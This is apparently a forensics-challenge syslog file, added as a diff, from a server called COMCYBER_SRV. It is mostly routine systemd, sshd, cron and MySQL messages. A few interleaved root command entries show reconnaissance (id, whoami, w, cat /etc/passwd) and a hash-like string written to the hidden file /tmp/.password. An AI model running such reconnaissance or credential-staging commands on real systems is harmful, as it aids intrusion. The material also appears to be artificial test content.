@@ -1,0 +1,909 @@
+Aug 27 12:08:35 COMCYBER_SRV xinetd[462955]: warning: can't get client address: Connection reset by peer
+Aug 27 12:08:42 COMCYBER_SRV systemd[1]: Stopping User Manager for UID 0...
+Aug 27 12:08:42 COMCYBER_SRV systemd[462935]: Stopped target Main User Target.
+Aug 27 12:08:42 COMCYBER_SRV systemd[462935]: Stopped target Basic System.
+Aug 27 12:08:42 COMCYBER_SRV systemd[462935]: Stopped target Paths.
+Aug 27 12:08:42 COMCYBER_SRV systemd[462935]: Stopped target Sockets.
+Aug 27 12:08:42 COMCYBER_SRV systemd[462935]: Stopped target Timers.
+Aug 27 12:08:42 COMCYBER_SRV systemd[462935]: dbus.socket: Succeeded.
+Aug 27 12:08:42 COMCYBER_SRV systemd[462935]: Closed D-Bus User Message Bus Socket.
+Aug 27 12:08:42 COMCYBER_SRV systemd[462935]: dirmngr.socket: Succeeded.
+Aug 27 12:08:42 COMCYBER_SRV systemd[462935]: Closed GnuPG network certificate management daemon.
+Aug 27 12:08:42 COMCYBER_SRV systemd[462935]: gpg-agent-browser.socket: Succeeded.
+Aug 27 12:08:42 COMCYBER_SRV systemd[462935]: Closed GnuPG cryptographic agent and passphrase cache (access for web browsers).
+Aug 27 12:08:42 COMCYBER_SRV systemd[462935]: gpg-agent-extra.socket: Succeeded.
+Aug 27 12:08:42 COMCYBER_SRV systemd[462935]: Closed GnuPG cryptographic agent and passphrase cache (restricted).
+Aug 27 12:08:42 COMCYBER_SRV systemd[462935]: gpg-agent-ssh.socket: Succeeded.
+Aug 27 12:08:42 COMCYBER_SRV systemd[462935]: Closed GnuPG cryptographic agent (ssh-agent emulation).
+Aug 27 12:08:42 COMCYBER_SRV systemd[462935]: gpg-agent.socket: Succeeded.
+Aug 27 12:08:42 COMCYBER_SRV systemd[462935]: Closed GnuPG cryptographic agent and passphrase cache.
+Aug 27 12:08:42 COMCYBER_SRV systemd[462935]: pk-debconf-helper.socket: Succeeded.
+Aug 27 12:08:42 COMCYBER_SRV systemd[462935]: Closed debconf communication socket.
+Aug 27 12:08:42 COMCYBER_SRV systemd[462935]: Reached target Shutdown.
+Aug 27 12:08:42 COMCYBER_SRV systemd[462935]: systemd-exit.service: Succeeded.
+Aug 27 12:08:42 COMCYBER_SRV systemd[462935]: Finished Exit the Session.
+Aug 27 12:08:42 COMCYBER_SRV systemd[462935]: Reached target Exit the Session.
+Aug 27 12:08:42 COMCYBER_SRV systemd[1]: user@0.service: Succeeded.
+Aug 27 12:08:42 COMCYBER_SRV systemd[1]: Stopped User Manager for UID 0.
+Aug 27 12:08:42 COMCYBER_SRV systemd[1]: Stopping User Runtime Directory /run/user/0...
+Aug 27 12:08:42 COMCYBER_SRV systemd[889]: run-user-0.mount: Succeeded.
+Aug 27 12:08:42 COMCYBER_SRV systemd[1]: run-user-0.mount: Succeeded.
+Aug 27 12:08:42 COMCYBER_SRV systemd[1]: user-runtime-dir@0.service: Succeeded.
+Aug 27 12:08:42 COMCYBER_SRV systemd[1]: Stopped User Runtime Directory /run/user/0.
+Aug 27 12:08:42 COMCYBER_SRV systemd[1]: Removed slice User Slice of UID 0.
+Aug 27 12:08:47 COMCYBER_SRV systemd[1]: Failed to start MySQL Server.
+Aug 27 12:08:47 COMCYBER_SRV systemd[1]: Stopped MySQL Server.
+Aug 27 12:08:47 COMCYBER_SRV systemd[1]: Starting MySQL Server...
+Aug 27 12:08:47 COMCYBER_SRV systemd[1]: Failed to start MySQL Server.
+Aug 27 12:08:48 COMCYBER_SRV systemd[1]: Stopped MySQL Server.
+Aug 27 12:08:48 COMCYBER_SRV systemd[1]: Starting MySQL Server...
+Aug 27 12:08:49 COMCYBER_SRV systemd[1]: Failed to start MySQL Server.
+Aug 27 12:08:49 COMCYBER_SRV systemd[1]: Stopped MySQL Server.
+Aug 27 12:08:49 COMCYBER_SRV systemd[1]: Starting MySQL Server...
+Aug 27 12:09:00 COMCYBER_SRV systemd[1]: Starting Clean php session files...
+Aug 27 12:09:01 COMCYBER_SRV CRON[463635]: (root) CMD (  [ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi)
+Aug 27 12:09:02 COMCYBER_SRV systemd[1]: phpsessionclean.service: Succeeded.
+Aug 27 12:09:02 COMCYBER_SRV systemd[1]: Finished Clean php session files.
+Aug 27 12:10:03 COMCYBER_SRV sshd[464361]: rexec line 17: Deprecated option UsePrivilegeSeparation
+Aug 27 12:10:03 COMCYBER_SRV sshd[464361]: rexec line 22: Deprecated option KeyRegenerationInterval
+Aug 27 12:10:03 COMCYBER_SRV sshd[464361]: rexec line 23: Deprecated option ServerKeyBits
+Aug 27 12:10:03 COMCYBER_SRV sshd[464361]: rexec line 39: Deprecated option RSAAuthentication
+Aug 27 12:10:03 COMCYBER_SRV sshd[464361]: rexec line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:10:03 COMCYBER_SRV sshd[464365]: rexec line 17: Deprecated option UsePrivilegeSeparation
+Aug 27 12:10:03 COMCYBER_SRV sshd[464365]: rexec line 22: Deprecated option KeyRegenerationInterval
+Aug 27 12:10:03 COMCYBER_SRV sshd[464365]: rexec line 23: Deprecated option ServerKeyBits
+Aug 27 12:10:03 COMCYBER_SRV sshd[464365]: rexec line 39: Deprecated option RSAAuthentication
+Aug 27 12:10:03 COMCYBER_SRV sshd[464365]: rexec line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:13:34 COMCYBER_SRV sshd[467786]: rexec line 17: Deprecated option UsePrivilegeSeparation
+Aug 27 12:13:34 COMCYBER_SRV sshd[467786]: rexec line 22: Deprecated option KeyRegenerationInterval
+Aug 27 12:13:34 COMCYBER_SRV sshd[467786]: rexec line 23: Deprecated option ServerKeyBits
+Aug 27 12:13:34 COMCYBER_SRV sshd[467786]: rexec line 39: Deprecated option RSAAuthentication
+Aug 27 12:13:34 COMCYBER_SRV sshd[467786]: rexec line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:13:34 COMCYBER_SRV sshd[467786]: reprocess config line 39: Deprecated option RSAAuthentication
+Aug 27 12:13:34 COMCYBER_SRV sshd[467786]: reprocess config line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:13:34 COMCYBER_SRV systemd[1]: Created slice User Slice of UID 0.
+Aug 27 12:13:34 COMCYBER_SRV systemd[1]: Starting User Runtime Directory /run/user/0...
+Aug 27 12:13:34 COMCYBER_SRV systemd[1]: Finished User Runtime Directory /run/user/0.
+Aug 27 12:13:34 COMCYBER_SRV systemd[1]: Starting User Manager for UID 0...
+Aug 27 12:13:34 COMCYBER_SRV systemd[467797]: Reached target Paths.
+Aug 27 12:13:34 COMCYBER_SRV systemd[467797]: Reached target Timers.
+Aug 27 12:13:34 COMCYBER_SRV systemd[467797]: Starting D-Bus User Message Bus Socket.
+Aug 27 12:13:34 COMCYBER_SRV systemd[467797]: Listening on GnuPG network certificate management daemon.
+Aug 27 12:13:34 COMCYBER_SRV systemd[467797]: Listening on GnuPG cryptographic agent and passphrase cache (access for web browsers).
+Aug 27 12:13:34 COMCYBER_SRV systemd[467797]: Listening on GnuPG cryptographic agent and passphrase cache (restricted).
+Aug 27 12:13:34 COMCYBER_SRV systemd[467797]: Listening on GnuPG cryptographic agent (ssh-agent emulation).
+Aug 27 12:13:34 COMCYBER_SRV systemd[467797]: Listening on GnuPG cryptographic agent and passphrase cache.
+Aug 27 12:13:34 COMCYBER_SRV systemd[467797]: Listening on debconf communication socket.
+Aug 27 12:13:34 COMCYBER_SRV systemd[467797]: Listening on D-Bus User Message Bus Socket.
+Aug 27 12:13:34 COMCYBER_SRV systemd[467797]: Reached target Sockets.
+Aug 27 12:13:34 COMCYBER_SRV systemd[467797]: Reached target Basic System.
+Aug 27 12:13:34 COMCYBER_SRV systemd[467797]: Reached target Main User Target.
+Aug 27 12:13:34 COMCYBER_SRV systemd[467797]: Startup finished in 196ms.
+Aug 27 12:13:34 COMCYBER_SRV systemd[1]: Started User Manager for UID 0.
+Aug 27 12:13:34 COMCYBER_SRV systemd[1]: Started Session 1750 of user root.
+Aug 27 12:13:34 COMCYBER_SRV systemd[1]: session-1750.scope: Succeeded.
+Aug 27 12:13:45 COMCYBER_SRV systemd[1]: Stopping User Manager for UID 0...
+Aug 27 12:13:45 COMCYBER_SRV systemd[467797]: Stopped target Main User Target.
+Aug 27 12:13:45 COMCYBER_SRV systemd[467797]: Stopped target Basic System.
+Aug 27 12:13:45 COMCYBER_SRV systemd[467797]: Stopped target Paths.
+Aug 27 12:13:45 COMCYBER_SRV systemd[467797]: Stopped target Sockets.
+Aug 27 12:13:45 COMCYBER_SRV systemd[467797]: Stopped target Timers.
+Aug 27 12:13:45 COMCYBER_SRV systemd[467797]: dbus.socket: Succeeded.
+Aug 27 12:13:45 COMCYBER_SRV systemd[467797]: Closed D-Bus User Message Bus Socket.
+Aug 27 12:13:45 COMCYBER_SRV systemd[467797]: dirmngr.socket: Succeeded.
+Aug 27 12:13:45 COMCYBER_SRV systemd[467797]: Closed GnuPG network certificate management daemon.
+Aug 27 12:13:45 COMCYBER_SRV systemd[467797]: gpg-agent-browser.socket: Succeeded.
+Aug 27 12:13:45 COMCYBER_SRV systemd[467797]: Closed GnuPG cryptographic agent and passphrase cache (access for web browsers).
+Aug 27 12:13:45 COMCYBER_SRV systemd[467797]: gpg-agent-extra.socket: Succeeded.
+Aug 27 12:13:45 COMCYBER_SRV systemd[467797]: Closed GnuPG cryptographic agent and passphrase cache (restricted).
+Aug 27 12:13:45 COMCYBER_SRV systemd[467797]: gpg-agent-ssh.socket: Succeeded.
+Aug 27 12:13:45 COMCYBER_SRV systemd[467797]: Closed GnuPG cryptographic agent (ssh-agent emulation).
+Aug 27 12:13:45 COMCYBER_SRV systemd[467797]: gpg-agent.socket: Succeeded.
+Aug 27 12:13:45 COMCYBER_SRV systemd[467797]: Closed GnuPG cryptographic agent and passphrase cache.
+Aug 27 12:13:45 COMCYBER_SRV systemd[467797]: pk-debconf-helper.socket: Succeeded.
+Aug 27 12:13:45 COMCYBER_SRV systemd[467797]: Closed debconf communication socket.
+Aug 27 12:13:45 COMCYBER_SRV systemd[467797]: Reached target Shutdown.
+Aug 27 12:13:45 COMCYBER_SRV systemd[467797]: systemd-exit.service: Succeeded.
+Aug 27 12:13:45 COMCYBER_SRV systemd[467797]: Finished Exit the Session.
+Aug 27 12:13:45 COMCYBER_SRV systemd[467797]: Reached target Exit the Session.
+Aug 27 12:13:45 COMCYBER_SRV systemd[1]: user@0.service: Succeeded.
+Aug 27 12:13:45 COMCYBER_SRV systemd[1]: Stopped User Manager for UID 0.
+Aug 27 12:13:45 COMCYBER_SRV systemd[1]: Stopping User Runtime Directory /run/user/0...
+Aug 27 12:13:45 COMCYBER_SRV systemd[889]: run-user-0.mount: Succeeded.
+Aug 27 12:13:45 COMCYBER_SRV systemd[1]: run-user-0.mount: Succeeded.
+Aug 27 12:13:45 COMCYBER_SRV systemd[1]: user-runtime-dir@0.service: Succeeded.
+Aug 27 12:13:45 COMCYBER_SRV systemd[1]: Stopped User Runtime Directory /run/user/0.
+Aug 27 12:13:45 COMCYBER_SRV systemd[1]: Removed slice User Slice of UID 0.
+Aug 27 12:13:49 COMCYBER_SRV systemd[1]: Failed to start MySQL Server.
+Aug 27 12:13:49 COMCYBER_SRV systemd[1]: Stopped MySQL Server.
+Aug 27 12:13:49 COMCYBER_SRV systemd[1]: Starting MySQL Server...
+Aug 27 12:13:49 COMCYBER_SRV systemd[1]: Failed to start MySQL Server.
+Aug 27 12:13:49 COMCYBER_SRV systemd[1]: Stopped MySQL Server.
+Aug 27 12:13:49 COMCYBER_SRV systemd[1]: Starting MySQL Server...
+Aug 27 12:13:51 COMCYBER_SRV systemd[1]: Failed to start MySQL Server.
+Aug 27 12:13:51 COMCYBER_SRV systemd[1]: Stopped MySQL Server.
+Aug 27 12:13:51 COMCYBER_SRV systemd[1]: Starting MySQL Server...
+Aug 27 12:15:01 COMCYBER_SRV CRON[468939]: (root) CMD (command -v debian-sa1 > /dev/null && debian-sa1 1 1)
+Aug 27 12:15:03 COMCYBER_SRV sshd[469109]: rexec line 17: Deprecated option UsePrivilegeSeparation
+Aug 27 12:15:03 COMCYBER_SRV sshd[469109]: rexec line 22: Deprecated option KeyRegenerationInterval
+Aug 27 12:15:03 COMCYBER_SRV sshd[469109]: rexec line 23: Deprecated option ServerKeyBits
+Aug 27 12:15:03 COMCYBER_SRV sshd[469109]: rexec line 39: Deprecated option RSAAuthentication
+Aug 27 12:15:03 COMCYBER_SRV sshd[469109]: rexec line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:15:04 COMCYBER_SRV sshd[469171]: rexec line 17: Deprecated option UsePrivilegeSeparation
+Aug 27 12:15:04 COMCYBER_SRV sshd[469171]: rexec line 22: Deprecated option KeyRegenerationInterval
+Aug 27 12:15:04 COMCYBER_SRV sshd[469171]: rexec line 23: Deprecated option ServerKeyBits
+Aug 27 12:15:04 COMCYBER_SRV sshd[469171]: rexec line 39: Deprecated option RSAAuthentication
+Aug 27 12:15:04 COMCYBER_SRV sshd[469171]: rexec line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:17:01 COMCYBER_SRV CRON[470947]: (root) CMD (   cd / && run-parts --report /etc/cron.hourly)
+Aug 27 12:18:24 COMCYBER_SRV xinetd[471894]: warning: can't get client address: Connection reset by peer
+Aug 27 12:18:36 COMCYBER_SRV sshd[472047]: rexec line 17: Deprecated option UsePrivilegeSeparation
+Aug 27 12:18:36 COMCYBER_SRV sshd[472047]: rexec line 22: Deprecated option KeyRegenerationInterval
+Aug 27 12:18:36 COMCYBER_SRV sshd[472047]: rexec line 23: Deprecated option ServerKeyBits
+Aug 27 12:18:36 COMCYBER_SRV sshd[472047]: rexec line 39: Deprecated option RSAAuthentication
+Aug 27 12:18:36 COMCYBER_SRV sshd[472047]: rexec line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:18:37 COMCYBER_SRV sshd[472047]: reprocess config line 39: Deprecated option RSAAuthentication
+Aug 27 12:18:37 COMCYBER_SRV sshd[472047]: reprocess config line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:18:37 COMCYBER_SRV systemd[1]: Created slice User Slice of UID 0.
+Aug 27 12:18:37 COMCYBER_SRV systemd[1]: Starting User Runtime Directory /run/user/0...
+Aug 27 12:18:37 COMCYBER_SRV systemd[1]: Finished User Runtime Directory /run/user/0.
+Aug 27 12:18:37 COMCYBER_SRV systemd[1]: Starting User Manager for UID 0...
+Aug 27 12:18:37 COMCYBER_SRV systemd[472058]: Reached target Paths.
+Aug 27 12:18:37 COMCYBER_SRV systemd[472058]: Reached target Timers.
+Aug 27 12:18:37 COMCYBER_SRV systemd[472058]: Starting D-Bus User Message Bus Socket.
+Aug 27 12:18:37 COMCYBER_SRV systemd[472058]: Listening on GnuPG network certificate management daemon.
+Aug 27 12:18:37 COMCYBER_SRV systemd[472058]: Listening on GnuPG cryptographic agent and passphrase cache (access for web browsers).
+Aug 27 12:18:37 COMCYBER_SRV systemd[472058]: Listening on GnuPG cryptographic agent and passphrase cache (restricted).
+Aug 27 12:18:37 COMCYBER_SRV systemd[472058]: Listening on GnuPG cryptographic agent (ssh-agent emulation).
+Aug 27 12:18:37 COMCYBER_SRV systemd[472058]: Listening on GnuPG cryptographic agent and passphrase cache.
+Aug 27 12:18:37 COMCYBER_SRV systemd[472058]: Listening on debconf communication socket.
+Aug 27 12:18:37 COMCYBER_SRV systemd[472058]: Listening on D-Bus User Message Bus Socket.
+Aug 27 12:18:37 COMCYBER_SRV systemd[472058]: Reached target Sockets.
+Aug 27 12:18:37 COMCYBER_SRV systemd[472058]: Reached target Basic System.
+Aug 27 12:18:37 COMCYBER_SRV systemd[472058]: Reached target Main User Target.
+Aug 27 12:18:37 COMCYBER_SRV systemd[472058]: Startup finished in 197ms.
+Aug 27 12:18:37 COMCYBER_SRV systemd[1]: Started User Manager for UID 0.
+Aug 27 12:18:37 COMCYBER_SRV systemd[1]: Started Session 1769 of user root.
+Aug 27 12:18:37 COMCYBER_SRV systemd[1]: session-1769.scope: Succeeded.
+Aug 27 12:18:47 COMCYBER_SRV systemd[1]: Stopping User Manager for UID 0...
+Aug 27 12:18:47 COMCYBER_SRV systemd[472058]: Stopped target Main User Target.
+Aug 27 12:18:47 COMCYBER_SRV systemd[472058]: Stopped target Basic System.
+Aug 27 12:18:47 COMCYBER_SRV systemd[472058]: Stopped target Paths.
+Aug 27 12:18:47 COMCYBER_SRV systemd[472058]: Stopped target Sockets.
+Aug 27 12:18:47 COMCYBER_SRV systemd[472058]: Stopped target Timers.
+Aug 27 12:18:47 COMCYBER_SRV systemd[472058]: dbus.socket: Succeeded.
+Aug 27 12:18:47 COMCYBER_SRV systemd[472058]: Closed D-Bus User Message Bus Socket.
+Aug 27 12:18:47 COMCYBER_SRV systemd[472058]: dirmngr.socket: Succeeded.
+Aug 27 12:18:47 COMCYBER_SRV systemd[472058]: Closed GnuPG network certificate management daemon.
+Aug 27 12:18:47 COMCYBER_SRV systemd[472058]: gpg-agent-browser.socket: Succeeded.
+Aug 27 12:18:47 COMCYBER_SRV systemd[472058]: Closed GnuPG cryptographic agent and passphrase cache (access for web browsers).
+Aug 27 12:18:47 COMCYBER_SRV systemd[472058]: gpg-agent-extra.socket: Succeeded.
+Aug 27 12:18:47 COMCYBER_SRV systemd[472058]: Closed GnuPG cryptographic agent and passphrase cache (restricted).
+Aug 27 12:18:47 COMCYBER_SRV systemd[472058]: gpg-agent-ssh.socket: Succeeded.
+Aug 27 12:18:47 COMCYBER_SRV systemd[472058]: Closed GnuPG cryptographic agent (ssh-agent emulation).
+Aug 27 12:18:47 COMCYBER_SRV systemd[472058]: gpg-agent.socket: Succeeded.
+Aug 27 12:18:47 COMCYBER_SRV systemd[472058]: Closed GnuPG cryptographic agent and passphrase cache.
+Aug 27 12:18:47 COMCYBER_SRV systemd[472058]: pk-debconf-helper.socket: Succeeded.
+Aug 27 12:18:47 COMCYBER_SRV systemd[472058]: Closed debconf communication socket.
+Aug 27 12:18:47 COMCYBER_SRV systemd[472058]: Reached target Shutdown.
+Aug 27 12:18:47 COMCYBER_SRV systemd[472058]: systemd-exit.service: Succeeded.
+Aug 27 12:18:47 COMCYBER_SRV systemd[472058]: Finished Exit the Session.
+Aug 27 12:18:47 COMCYBER_SRV systemd[472058]: Reached target Exit the Session.
+Aug 27 12:18:47 COMCYBER_SRV systemd[1]: user@0.service: Succeeded.
+Aug 27 12:18:47 COMCYBER_SRV systemd[1]: Stopped User Manager for UID 0.
+Aug 27 12:18:47 COMCYBER_SRV systemd[1]: Stopping User Runtime Directory /run/user/0...
+Aug 27 12:18:47 COMCYBER_SRV systemd[889]: run-user-0.mount: Succeeded.
+Aug 27 12:18:47 COMCYBER_SRV systemd[1]: run-user-0.mount: Succeeded.
+Aug 27 12:18:47 COMCYBER_SRV systemd[1]: user-runtime-dir@0.service: Succeeded.
+Aug 27 12:18:47 COMCYBER_SRV systemd[1]: Stopped User Runtime Directory /run/user/0.
+Aug 27 12:18:47 COMCYBER_SRV systemd[1]: Removed slice User Slice of UID 0.
+Aug 27 12:18:51 COMCYBER_SRV systemd[1]: Failed to start MySQL Server.
+Aug 27 12:18:51 COMCYBER_SRV systemd[1]: Stopped MySQL Server.
+Aug 27 12:18:51 COMCYBER_SRV systemd[1]: Starting MySQL Server...
+Aug 27 12:18:51 COMCYBER_SRV systemd[1]: Failed to start MySQL Server.
+Aug 27 12:18:51 COMCYBER_SRV systemd[1]: Stopped MySQL Server.
+Aug 27 12:18:51 COMCYBER_SRV systemd[1]: Starting MySQL Server...
+Aug 27 12:18:52 COMCYBER_SRV systemd[1]: Failed to start MySQL Server.
+Aug 27 12:18:52 COMCYBER_SRV systemd[1]: Stopped MySQL Server.
+Aug 27 12:18:53 COMCYBER_SRV systemd[1]: Starting MySQL Server...
+Aug 27 12:19:25 COMCYBER_SRV xinetd[472983]: warning: can't get client address: Connection reset by peer
+Aug 27 12:20:03 COMCYBER_SRV sshd[473470]: rexec line 17: Deprecated option UsePrivilegeSeparation
+Aug 27 12:20:03 COMCYBER_SRV sshd[473470]: rexec line 22: Deprecated option KeyRegenerationInterval
+Aug 27 12:20:03 COMCYBER_SRV sshd[473470]: rexec line 23: Deprecated option ServerKeyBits
+Aug 27 12:20:03 COMCYBER_SRV sshd[473470]: rexec line 39: Deprecated option RSAAuthentication
+Aug 27 12:20:03 COMCYBER_SRV sshd[473470]: rexec line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:20:03 COMCYBER_SRV sshd[473501]: rexec line 17: Deprecated option UsePrivilegeSeparation
+Aug 27 12:20:03 COMCYBER_SRV sshd[473501]: rexec line 22: Deprecated option KeyRegenerationInterval
+Aug 27 12:20:03 COMCYBER_SRV sshd[473501]: rexec line 23: Deprecated option ServerKeyBits
+Aug 27 12:20:03 COMCYBER_SRV sshd[473501]: rexec line 39: Deprecated option RSAAuthentication
+Aug 27 12:20:03 COMCYBER_SRV sshd[473501]: rexec line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:20:05 COMCYBER_SRV xinetd[473554]: warning: can't get client address: Connection reset by peer
+Aug 27 12:20:32 COMCYBER_SRV sshd[474144]: rexec line 17: Deprecated option UsePrivilegeSeparation
+Aug 27 12:20:32 COMCYBER_SRV sshd[474144]: rexec line 22: Deprecated option KeyRegenerationInterval
+Aug 27 12:20:32 COMCYBER_SRV sshd[474144]: rexec line 23: Deprecated option ServerKeyBits
+Aug 27 12:20:32 COMCYBER_SRV sshd[474144]: rexec line 39: Deprecated option RSAAuthentication
+Aug 27 12:20:32 COMCYBER_SRV sshd[474144]: rexec line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:20:32 COMCYBER_SRV slapd[1059]: <= bdb_equality_candidates: (uid) not indexed
+Aug 27 12:22:00 COMCYBER_SRV xinetd[475051]: warning: can't get client address: Connection reset by peer
+Aug 27 12:23:39 COMCYBER_SRV sshd[476221]: rexec line 17: Deprecated option UsePrivilegeSeparation
+Aug 27 12:23:39 COMCYBER_SRV sshd[476221]: rexec line 22: Deprecated option KeyRegenerationInterval
+Aug 27 12:23:39 COMCYBER_SRV sshd[476221]: rexec line 23: Deprecated option ServerKeyBits
+Aug 27 12:23:39 COMCYBER_SRV sshd[476221]: rexec line 39: Deprecated option RSAAuthentication
+Aug 27 12:23:39 COMCYBER_SRV root[250822]: CMD(id) [0]
+Aug 27 12:23:39 COMCYBER_SRV sshd[476221]: rexec line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:23:39 COMCYBER_SRV sshd[476221]: reprocess config line 39: Deprecated option RSAAuthentication
+Aug 27 12:23:39 COMCYBER_SRV sshd[476221]: reprocess config line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:23:39 COMCYBER_SRV systemd[1]: Created slice User Slice of UID 0.
+Aug 27 12:23:39 COMCYBER_SRV systemd[1]: Starting User Runtime Directory /run/user/0...
+Aug 27 12:23:40 COMCYBER_SRV systemd[1]: Finished User Runtime Directory /run/user/0.
+Aug 27 12:23:40 COMCYBER_SRV systemd[1]: Starting User Manager for UID 0...
+Aug 27 12:23:40 COMCYBER_SRV systemd[476232]: Reached target Paths.
+Aug 27 12:23:40 COMCYBER_SRV systemd[476232]: Reached target Timers.
+Aug 27 12:23:40 COMCYBER_SRV systemd[476232]: Starting D-Bus User Message Bus Socket.
+Aug 27 12:23:40 COMCYBER_SRV systemd[476232]: Listening on GnuPG network certificate management daemon.
+Aug 27 12:23:40 COMCYBER_SRV systemd[476232]: Listening on GnuPG cryptographic agent and passphrase cache (access for web browsers).
+Aug 27 12:23:40 COMCYBER_SRV systemd[476232]: Listening on GnuPG cryptographic agent and passphrase cache (restricted).
+Aug 27 12:23:40 COMCYBER_SRV systemd[476232]: Listening on GnuPG cryptographic agent (ssh-agent emulation).
+Aug 27 12:23:40 COMCYBER_SRV systemd[476232]: Listening on GnuPG cryptographic agent and passphrase cache.
+Aug 27 12:23:40 COMCYBER_SRV systemd[476232]: Listening on debconf communication socket.
+Aug 27 12:23:40 COMCYBER_SRV systemd[476232]: Listening on D-Bus User Message Bus Socket.
+Aug 27 12:23:40 COMCYBER_SRV systemd[476232]: Reached target Sockets.
+Aug 27 12:23:40 COMCYBER_SRV systemd[476232]: Reached target Basic System.
+Aug 27 12:23:40 COMCYBER_SRV systemd[476232]: Reached target Main User Target.
+Aug 27 12:23:40 COMCYBER_SRV systemd[476232]: Startup finished in 208ms.
+Aug 27 12:23:40 COMCYBER_SRV systemd[1]: Started User Manager for UID 0.
+Aug 27 12:23:40 COMCYBER_SRV root[250822]: CMD(whoami) [0]
+Aug 27 12:23:40 COMCYBER_SRV systemd[1]: Started Session 1786 of user root.
+Aug 27 12:23:40 COMCYBER_SRV systemd[1]: session-1786.scope: Succeeded.
+Aug 27 12:23:50 COMCYBER_SRV systemd[1]: Stopping User Manager for UID 0...
+Aug 27 12:23:50 COMCYBER_SRV systemd[476232]: Stopped target Main User Target.
+Aug 27 12:23:50 COMCYBER_SRV systemd[476232]: Stopped target Basic System.
+Aug 27 12:23:50 COMCYBER_SRV systemd[476232]: Stopped target Paths.
+Aug 27 12:23:50 COMCYBER_SRV systemd[476232]: Stopped target Sockets.
+Aug 27 12:23:50 COMCYBER_SRV systemd[476232]: Stopped target Timers.
+Aug 27 12:23:50 COMCYBER_SRV systemd[476232]: dbus.socket: Succeeded.
+Aug 27 12:23:50 COMCYBER_SRV systemd[476232]: Closed D-Bus User Message Bus Socket.
+Aug 27 12:23:50 COMCYBER_SRV systemd[476232]: dirmngr.socket: Succeeded.
+Aug 27 12:23:50 COMCYBER_SRV systemd[476232]: Closed GnuPG network certificate management daemon.
+Aug 27 12:23:50 COMCYBER_SRV root[250822]: CMD(w) [0]
+Aug 27 12:23:50 COMCYBER_SRV systemd[476232]: gpg-agent-browser.socket: Succeeded.
+Aug 27 12:23:50 COMCYBER_SRV systemd[476232]: Closed GnuPG cryptographic agent and passphrase cache (access for web browsers).
+Aug 27 12:23:50 COMCYBER_SRV systemd[476232]: gpg-agent-extra.socket: Succeeded.
+Aug 27 12:23:50 COMCYBER_SRV systemd[476232]: Closed GnuPG cryptographic agent and passphrase cache (restricted).
+Aug 27 12:23:50 COMCYBER_SRV systemd[476232]: gpg-agent-ssh.socket: Succeeded.
+Aug 27 12:23:50 COMCYBER_SRV systemd[476232]: Closed GnuPG cryptographic agent (ssh-agent emulation).
+Aug 27 12:23:50 COMCYBER_SRV systemd[476232]: gpg-agent.socket: Succeeded.
+Aug 27 12:23:50 COMCYBER_SRV systemd[476232]: Closed GnuPG cryptographic agent and passphrase cache.
+Aug 27 12:23:50 COMCYBER_SRV systemd[476232]: pk-debconf-helper.socket: Succeeded.
+Aug 27 12:23:50 COMCYBER_SRV systemd[476232]: Closed debconf communication socket.
+Aug 27 12:23:50 COMCYBER_SRV systemd[476232]: Reached target Shutdown.
+Aug 27 12:23:50 COMCYBER_SRV systemd[476232]: systemd-exit.service: Succeeded.
+Aug 27 12:23:50 COMCYBER_SRV systemd[476232]: Finished Exit the Session.
+Aug 27 12:23:50 COMCYBER_SRV systemd[476232]: Reached target Exit the Session.
+Aug 27 12:23:50 COMCYBER_SRV systemd[1]: user@0.service: Succeeded.
+Aug 27 12:23:50 COMCYBER_SRV root[250822]: CMD(cat /etc/passwd) [0]
+Aug 27 12:23:50 COMCYBER_SRV systemd[1]: Stopped User Manager for UID 0.
+Aug 27 12:23:50 COMCYBER_SRV systemd[1]: Stopping User Runtime Directory /run/user/0...
+Aug 27 12:23:50 COMCYBER_SRV systemd[889]: run-user-0.mount: Succeeded.
+Aug 27 12:23:50 COMCYBER_SRV systemd[1]: run-user-0.mount: Succeeded.
+Aug 27 12:23:50 COMCYBER_SRV systemd[1]: user-runtime-dir@0.service: Succeeded.
+Aug 27 12:23:50 COMCYBER_SRV systemd[1]: Stopped User Runtime Directory /run/user/0.
+Aug 27 12:23:50 COMCYBER_SRV systemd[1]: Removed slice User Slice of UID 0.
+Aug 27 12:23:52 COMCYBER_SRV systemd[1]: Failed to start MySQL Server.
+Aug 27 12:23:52 COMCYBER_SRV systemd[1]: Stopped MySQL Server.
+Aug 27 12:23:52 COMCYBER_SRV systemd[1]: Starting MySQL Server...
+Aug 27 12:23:53 COMCYBER_SRV systemd[1]: Failed to start MySQL Server.
+Aug 27 12:23:53 COMCYBER_SRV systemd[1]: Stopped MySQL Server.
+Aug 27 12:23:53 COMCYBER_SRV systemd[1]: Starting MySQL Server...
+Aug 27 12:23:54 COMCYBER_SRV systemd[1]: Failed to start MySQL Server.
+Aug 27 12:23:54 COMCYBER_SRV systemd[1]: Stopped MySQL Server.
+Aug 27 12:23:54 COMCYBER_SRV systemd[1]: Starting MySQL Server...
+Aug 27 12:25:01 COMCYBER_SRV CRON[477586]: (root) CMD (command -v debian-sa1 > /dev/null && debian-sa1 1 1)
+Aug 27 12:25:02 COMCYBER_SRV sshd[477600]: rexec line 17: Deprecated option UsePrivilegeSeparation
+Aug 27 12:25:02 COMCYBER_SRV root[250822]: CMD(echo 'efa3fb1f409aa622dddd7220ad6567580fb68b68' > /tmp/.password) [0]
+Aug 27 12:25:02 COMCYBER_SRV sshd[477600]: rexec line 22: Deprecated option KeyRegenerationInterval
+Aug 27 12:25:02 COMCYBER_SRV sshd[477600]: rexec line 23: Deprecated option ServerKeyBits
+Aug 27 12:25:02 COMCYBER_SRV sshd[477600]: rexec line 39: Deprecated option RSAAuthentication
+Aug 27 12:25:02 COMCYBER_SRV sshd[477600]: rexec line 46: Deprecated option RhostsRSAAuthentication
